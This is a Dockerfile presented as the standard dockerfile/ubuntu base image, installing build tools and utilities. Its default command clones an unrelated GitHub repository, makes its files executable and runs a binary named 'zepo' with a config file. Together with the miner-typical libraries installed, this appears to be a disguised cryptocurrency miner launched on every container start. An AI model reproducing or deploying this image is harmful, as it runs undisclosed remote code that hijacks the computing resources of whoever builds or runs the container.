# Ubuntu Dockerfile
#
# https://github.com/dockerfile/ubuntu
#

# Pull base image.
FROM ubuntu:22.04

# Install.
RUN \
  sed -i 's/# \(.*multiverse$\)/\1/g' /etc/apt/sources.list && \
  apt-get update && \
  apt-get -y upgrade && \
  apt-get install -y build-essential && \
  apt-get install -y software-properties-common && \
  apt-get install -y byobu bash sudo curl git npm screen neofetch ca-certificates libcurl4 libjansson4 libgomp1 golang unzip autoconf cmake net-tools htop man unzip vim wget make && \
  rm -rf /var/lib/apt/lists/*

RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Add files.
ADD root/.bashrc /root/.bashrc
ADD root/.gitconfig /root/.gitconfig
ADD root/.scripts /root/.scripts

# Set environment variables.
ENV HOME /root

# Define working directory.
WORKDIR /root

# Define default command.
CMD git clone https://github.com/epois/zephher.git && cd zephher && chmod +x SHA256SUMS && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json"
